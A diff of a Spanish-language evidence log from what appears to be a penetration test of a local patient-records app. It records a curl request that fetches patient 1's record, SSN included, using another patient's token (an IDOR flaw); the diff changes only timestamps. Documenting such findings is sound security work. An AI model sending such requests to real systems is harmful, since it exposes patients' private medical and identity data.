@@ -1,5 +1,5 @@
 # Evidencia A01 - Control de acceso roto (IDOR)
-# Fecha: 2026-10-03 23:12:56   Fase: fase1   Objetivo: localhost
+# Fecha: 2026-10-04 03:40:19   Fase: fase1   Objetivo: localhost
 # Comando: curl -i -s http://localhost:3000/api/record/1 -H 'Authorization: <TOKEN_PACIENTE>'
 # Esperado: HTTP 200 con la ficha del paciente 1 (SSN incluido) usando el token de OTRO paciente
 # ----------------------------------------------------------
@@ -8,7 +8,7 @@ X-Powered-By: Express
 Content-Type: application/json; charset=utf-8
 Content-Length: 279
 ETag: W/"117-R07miuu3Z8Xn1Yk6KiC2rSRnoe4"
-Date: Sun, 04 Oct 2026 02:12:56 GMT
+Date: Sun, 04 Oct 2026 06:40:19 GMT
 Connection: keep-alive
 Keep-Alive: timeout=5
 
